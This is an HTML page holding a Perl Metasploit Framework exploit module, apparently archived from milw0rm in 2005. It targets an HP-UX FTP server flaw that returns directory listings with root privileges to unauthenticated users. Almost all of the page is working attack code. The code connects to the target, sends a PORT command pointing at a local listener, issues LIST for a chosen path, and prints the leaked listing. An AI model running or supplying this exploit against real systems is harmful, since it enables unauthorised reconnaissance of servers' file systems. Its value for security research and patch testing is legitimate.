<html>
<head>
<title>HP-UX FTP Server Preauthentication Directory Listing Exploit (meta)</title>
<pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::hpux_ftpd_preauth_list;
use base &quot;Msf::Exploit&quot;;
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  =&gt; 'HP-UX FTP Server Preauthentication Directory Listing',
	'Version'  =&gt; '$Revision: 1.8 $',
	'Authors' =&gt; [ 'Optyx  &lt;optyx [at] uberhax0r.net&gt;'],
	'Arch'  =&gt; [ ],
	'OS'    =&gt; [ 'hpux' ],
	'Priv'  =&gt; 0,
	'UserOpts'  =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The FTP server port', 21],
		'RPATH' =&gt; [1, 'DATA', 'The path name to list', &quot;/&quot;],
	  },

	'Description'  =&gt; Pex::Text::Freeform(qq{
        This exploit abuses an unpublished vulnerability in the HP-UX FTP
        service. This flaw allows an unauthenticated remote user to obtain
        directory listings from this server with the privileges of the root
        user. This vulnerability was silently patched by HP sometime between 
		2001 and 2003.
}),
	'Refs'  =&gt;
	  [
		# None
	  ],

	'Keys' =&gt; ['ftp'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_path = $self-&gt;GetVar('RPATH');

	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; $target_port,
		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
	  );
	  
	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return;
	}

	my $l = IO::Socket::INET-&gt;new
	  (
		Proto  =&gt; 'tcp',
		Listen =&gt; 5,
		Blocking =&gt; 0,
		ReuseAddr =&gt; 1,
	  );

	my $r;
	my $prt = &quot;,&quot;.int($l-&gt;sockport / 256).&quot;,&quot;.int($l-&gt;sockport % 256);
	my $sel = IO::Select-&gt;new($l);
	my $cmd = &quot;PORT &quot;.join(&quot;,&quot;, split(/\./,Pex::InternetIP($target_host))).$prt.&quot;\r\n&quot;;

	$r .= $s-&gt;Recv(-1, 5);

	$s-&gt;Send($cmd);
	$r .= $s-&gt;Recv(-1, 5);

	$s-&gt;Send(&quot;LIST $target_path\r\n&quot;);
	$r .= $s-&gt;Recv(-1, 5);
	$s-&gt;Close;

	foreach (split(/\n/, $r)) {
		chomp;
		$self-&gt;PrintLine(&quot;[*] $_&quot;);
	}

	my @rdy = $sel-&gt;can_read(3);
	if (scalar(@rdy)) {
		my $x = $l-&gt;accept();
		$self-&gt;PrintLine(&quot;[*] Accepted connection from &quot;.$x-&gt;sockhost.&quot;:&quot;.$x-&gt;sockport);

		while (&lt;$x&gt;) {
			chomp;
			$self-&gt;PrintLine($_);
		}
		$x-&gt;shutdown(2);
		$x-&gt;close;
	}
	$l-&gt;shutdown(2);
	$l-&gt;close;
	return;
}

# milw0rm.com [2005-10-19]
</pre>
</html>

